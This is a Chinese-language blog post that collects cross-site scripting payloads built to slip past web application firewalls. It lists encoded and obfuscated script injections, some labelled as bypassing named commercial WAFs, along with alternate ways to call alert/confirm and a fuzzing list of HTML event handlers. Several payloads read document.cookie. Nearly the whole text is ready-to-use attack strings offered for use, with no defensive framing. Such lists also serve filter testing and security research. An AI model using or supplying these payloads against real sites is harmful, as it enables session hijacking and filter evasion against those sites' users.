---
layout: post
title:  "工作中梳理XSS Bypass WAF相关Payload"
date:   2020-12-10 10:02:01 +0800
categories: POC收集
tag: XSS漏洞
---

* content
{:toc}

### 一、工作中使用和收集payload：

```html
<script%20~~~>\u0061\u006C\u0065\u0072\u0074``</script%20~~~>
<\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video> 
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script> 
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange> <iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad> 
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter> 
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll> 
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)">
</body onPropertyChange> <svg onLoad svg onLoad="javascript:javascript:alert(1)">
</svg onLoad> <body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide> 
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver> 
<body onUnload body onUnload="javascript:javascript:alert(1)">
<details open ontoggle=top['prompt'](1)>
<details open ontoggle=top['al'%2b'ert'](1)>
<details open ontoggle=top.\u0065val('ale'%2B'rt(1)') >
<svg/onload =setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))>
<svg/onload =setTimeout('\141\154\145\162\164\50\61\51')>
<svg/onload =\u0073etTimeout('\141\154\145\162\164\50\61\51')>
<svg/onload =\u0073etTimeout('\u0061lert(1)')>
<details open ontoggle=\u0061lert(/xss/)>
<img/src/onerror=.1|alert``>
<d3v/onauxclick=alert`1`>
javascript:a=alert;a(1);
<d3v/onauxclick=[2].some(confirm)>
<svg id=javascript:alert(10) onload=location=id>
<img src=something onauxclick='new Function `al\ert\`xss\``'>
<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
<svg><a xlink:href="javascript:alert(14)"><rect width="1000" height="1000" fill="black"/></a></svg>
<math><y/xlink:href%3djavascript:alert(51)>test1
<svg/onauxclick=0;[1].some(confirm)>
<svg/onload=%26nbsp;alert`bohdan`+1'">
<img id=%26%23x101; src=x onerror=%26%23x101;;alert`1`;>
<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']
<d3v/onauxclick=[2].some(self['con'%2b'firm'])>   (可绕过Akamai WAF)
<d3v/onauxclick=[document.cookie].some(self['con'%2b'firm'])>aaaaa
<svg onload="import('data:text/javascript,al'%2b''%2b'ert(0)')">
</script ^__^<a><svg/onload=alert`1`>可绕过</script>标签限制
<svg onload=alert&#0000000040"")>绕过cloudflare waf
<svg onx=() onload=(confirm)(1)>
≋ "><!'/*"*\'/*\"/*--><Image SrcSet=K */; OnError=confirm(document.domain) //># ≋
<a/onclick=alert&#40;1&#41;>xiaohuihui
<img src="" onx=() onerror=(confirm)(1)>
<IMG SRC=x onwheel=(confirm)(1)>(绕过imperva)
<sVg+OnPointerEnter%3D"location%3D`javas`%2B`cript%3Aale`%2B`rt%252`%2B`81%252`%2B`9`%3B%2F%2F<%2Fdiv">
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydGB4aWFvaHVpaHVpYDwvc2NyaXB0Pg=='></object>
<a href="javascript:%EF%BB%BFalert(111)">a
"><details/open/ontoggle=confirm`/xiaohuihui!/`>
<h1 onclick=\u0061\u006cert("xiaohuihui")>xiaohuihui</h1>
<a onclick=\u0061\u006cert("xiaohuihui")>xiaohuihui</a>
<p onclick=\u0061\u006cert("xiaohuihui")>xiaohuihui</p>
<marquee onclick=\u0061\u006cert("xiaohuihui")>xiaohuihui</marquee>
<h1 onmouseover= top[8680439..toString(30)]("xiaohuihui")>aaa
<h1 onmouseover=top[/al/.source+/ert/.source]("xiaohuihui")>
</script><h1 onmouseover=["xiaohuihui"].find(alert)>
</script><h1 onmouseover= (((confirm)))`xiaohuihui`>
<input+onblur%3Dtop[%2Fal%2F.source%2B%2Fert%2F.source]("xiaohuihui")+autofocus><input+autofocus>
<input onblur=["xiaohuihui"].find(alert) autofocus><input autofocus>
<input onblur=(((confirm)))("xiaohuihui") autofocus><input autofocus>
<p/onclick=%27new%20Function`al\ert\`\u0059\u0030\u0030\u0030\``%27>d
<p/onclick=self[`aler`%2b`t`]`\u0059\u0030\u0030\u0030`>d
<form><button formaction=javascript&colon;alert('xss_by_xiaohuihui!')>xiaohuihui
<marquee><form><button formacti\u006fn=javascript&colon;pr\u006fmpt('xss_by_xiaohuihui!')>xiaohuihui</marquee>
</script><!--><svg onload=[document.domain].find%26%2340;alert%26rpar;>
"><svg/onload=alert`${'000'}¥000!.was.here$`>
<svg/onload=eval("ale"+"rt")(`✓${alert`✓`}`)>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<marquee loop=1 width=0 onfinish=\u0070\u0072\u006f\u006d\u0070\u0074(document.cookie)>xiaohuihui</marquee>
"><details/open/ontoggle=confirm`/xss_by_xiaohuihui!/`>
<img/accesskey='x'onclick='(alert)(`TakSec`)'>
<svg/onload=((pro\u006dpt))(`1${alert`2`}`)//
```

### 二、相关弹框Bypass

```html
['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
-content["alert"](6)-
(alert)(1)
a=alert,a(1)
[1].find(alert)
top[“al”+”ert”](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
confirm()
confirm``
(confirm``)
{confirm``}
[confirm``]
(((confirm)))``
co\u006efirm()
new class extends confirm``{}
[8].find(confirm)
[8].map(confirm)
[8].some(confirm)
[8].every(confirm)
[8].filter(confirm)
[8].findIndex(confirm)
self[`aler`%2b`t`]`1`
'new Function`al\ert\`1\``'
'new Function`pro\mpt\`1\``'
alert(document['cookie'])
with(document)alert(cookie)
eval('ale'+'rt(1)')window['alert'](0)
parent['alert'](1)
self['alert'](2)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[12].forEach(alert);
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
alert.call(null, document.domain);
[document.domain].forEach(alert);
alert.apply(null, [document.domain]);
alert.bind()(document.domain);
alert(this['document']['domain']);
(new Map()).set(1, document.domain).forEach(alert);
"onfocus="alert('xiaohuihui')"+autofocus="
```

### 三、FUZZ相关html事件

```html
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ononline="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onoffline="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpagehide="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpageshow="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpopstate="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onresize="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onstorage="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onunload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onblur="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncontextmenu="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oninput="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oninvalid="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onreset="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsearch="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onselect="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsubmit="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeydown="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeypress="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeyup="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onclick="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondblclick="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousedown="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousemove="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseout="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseover="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseup="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousewheel="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onwheel="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondrag="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragend="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragenter="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragleave="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragover="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragstart="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondrop="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onscroll="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncopy="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncut="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpaste="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onabort="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncanplay="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncanplaythrough="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncuechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondurationchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onemptied="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onended="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadeddata="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadedmetadata="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadstart="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpause="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onplay="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onplaying="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onprogress="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onratechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onseeked="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onseeking="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onstalled="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsuspend="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onvolumechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onshow="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">
```
